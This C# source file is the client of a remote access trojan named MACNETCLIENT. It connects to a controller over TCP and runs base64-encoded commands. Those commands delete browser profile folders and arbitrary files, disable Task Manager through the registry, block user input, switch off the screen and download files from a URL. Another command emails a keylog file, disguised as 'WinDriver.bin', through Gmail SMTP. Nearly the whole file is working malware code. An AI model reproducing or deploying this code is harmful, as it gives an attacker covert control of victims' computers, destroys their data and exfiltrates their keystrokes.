using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.Net.Mail;
using Microsoft.Win32;
using System.Speech.Synthesis;
namespace MACNETCLIENT
{
    class MACNETCLIENT
    {
        enum MONITOR_ { ON = -1, OFF = 2 }
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        NetworkStream netst;
        StreamReader getcommand;
        TcpClient tcpclient;
        public static String LOG_FILE_LOCATION = "C:\\users\\" + Environment.UserName + "\\cache\\WinDriver.bin";
        String command;
        bool clientalive;
        private List<string> browser_data_locates = new List<string>{ "C:\\Users\\"+Environment.UserName+"\\AppData\\Local\\Google\\Chrome\\User Data", "C:\\Users\\"+Environment.UserName+"\\AppData\\Local\\Mozilla\\Firefox\\Profiles" , "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "C:\\Users\\"+Environment.UserName+"\\AppData\\Local\\Opera\\Opera", "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Opera\\Opera" };
        // 
        public void start(string IP,int PORT)
        {
            
            while (true)
            {
                try
                {
                    tcpclient = new TcpClient(IP,PORT);
                    break;
                }
                catch (Exception ee)
                {
                    continue;
                }
            }
            netst = tcpclient.GetStream();
            getcommand = new StreamReader(netst);
            clientalive = true;
            Thread COMMAND_THR = new Thread(new ThreadStart(getcommandd));
            COMMAND_THR.Start();
        }

        void getcommandd()
        {
            try
            {
                while (clientalive)
                {
                    command = getcommand.ReadLine();
                    if (command != null && command.Length >= 0)
                    {
                        command = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(command));
                        if (command.StartsWith("SERVER->"))
                        {
                            process_command(command);
                        }
                        else
                        {
                            continue;
                        }
                    }
                }
            }catch(Exception e)
            {

            }
            
        }
        void process_command(string command)
        {
            if (command.StartsWith("SERVER->OPEN_WEBSITE->"))
            {
                if (command.Substring("SERVER->OPEN_WEBSITE->".Length).StartsWith("http"))
                    System.Diagnostics.Process.Start(command.Substring("SERVER->OPEN_WEBSITE->".Length));
                else
                    System.Diagnostics.Process.Start("http:\\\\" + command.Substring("SERVER->OPEN_WEBSITE->".Length));
            }
            else if (command.StartsWith("SERVER->CLOSE_CLIENT"))
            {
                close_client();
            }
            else if (command.StartsWith("SERVER->MESSAGE_BOX->"))
            {
                MessageBox.Show(command.Substring("SERVER->MESSAGE_BOX->".Length));
            }
            else if (command.StartsWith("SERVER->CLEAR_BROWSERS_"))
            {
                foreach(string i in browser_data_locates)
                {
                    try
                    {
                        if (Directory.Exists(i))
                            Directory.Delete(i, true);
                    }catch(Exception ee)
                    {

                    }
                }
            }
            else if (command.StartsWith("SERVER->DELETE_FILE->"))
            {
                if (File.Exists(command.Substring("SERVER->DELETE_FILE->".Length)))
                {
                    File.Delete(command.Substring("SERVER->DELETE_FILE->".Length));
                }
            }
            else if (command.StartsWith("SERVER->BLOCK_INPUT->"))
            {
                BlockInput(true);
                Thread.Sleep(3000);
                BlockInput(false);
            }
            else if (command.StartsWith("SERVER->TASKMGR_"))
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                if (command.Substring(16) == "DISABLE")
                {
                    key.SetValue("DisableTaskMgr",1);
                    key.Close();
                }
                else
                {
                    key.SetValue("DisableTaskMgr", 0);
                    key.Close();
                }
            }
            else if (command.StartsWith("SERVER->SPEAKING_TEXT->"))
            {
                SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();
                speechSynthesizer.SetOutputToDefaultAudioDevice();
                speechSynthesizer.Speak(command.Substring(23));
            }
            else if (command.StartsWith("SERVER->SCREEN_OFF"))
            {
                SendMessage(0xFFFF, 0x112, 0xF170, (int)MONITOR_.OFF);
            }
            else if (command.StartsWith("SERVER->SET_WALLPAPER_URL->"))
            {
                String url = command.Substring(27);
                WebClient webclient = new WebClient();
                if (!Directory.Exists("C:\\users\\" + Environment.UserName + "\\cache"))
                    Directory.CreateDirectory("C:\\users\\" + Environment.UserName + "\\cache");
                webclient.DownloadFile(url, "C:\\users\\"+Environment.UserName+"\\cache\\wp.jpg");
                SystemParametersInfo(0x0014, 0, "C:\\users\\" + Environment.UserName + "\\cache\\wp.jpg", 0x01);
                File.Delete("C:\\users\\" + Environment.UserName + "\\cache\\wp.jpg");
                Directory.Delete("C:\\users\\" + Environment.UserName + "\\cache");
            }
            else if (command.StartsWith("SERVER->SEND_LOG_EMAIL"))
            {
                String USERNAME="", PASSWORD="";
                int lastindex = 23;
                command = command.Substring(24);
                for(int i=0;i<command.Length;i++)
                {
                    if (command[i] == '-' && command[i + 1] == '>')
                    {
                        lastindex = i + 2;
                        break;
                    }
                    else
                        USERNAME += command[i];
                }
                for(int i = lastindex;i<command.Length;i++)
                {
                    PASSWORD += command[i];
                }
                
                SmtpClient smtpclient = new SmtpClient();
                smtpclient.Port = 587;
                smtpclient.Host = "smtp.gmail.com";
                smtpclient.EnableSsl = true;
                smtpclient.Credentials = new NetworkCredential(USERNAME, PASSWORD);
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(USERNAME, "MACNET");
                mail.To.Add(USERNAME);
                mail.Subject = "MACNET KEYLOG FILE";
                mail.Attachments.Add(new Attachment(LOG_FILE_LOCATION));
                smtpclient.Send(mail);
            }
        }

        void close_client()
        {
            try
            {
                getcommand.Close();
                netst.Close();
                tcpclient.Close();
            }
            catch (Exception ee)
            {

            }
            finally
            {
                clientalive = false;
                Environment.Exit(-1);
            }
        }
    }
}
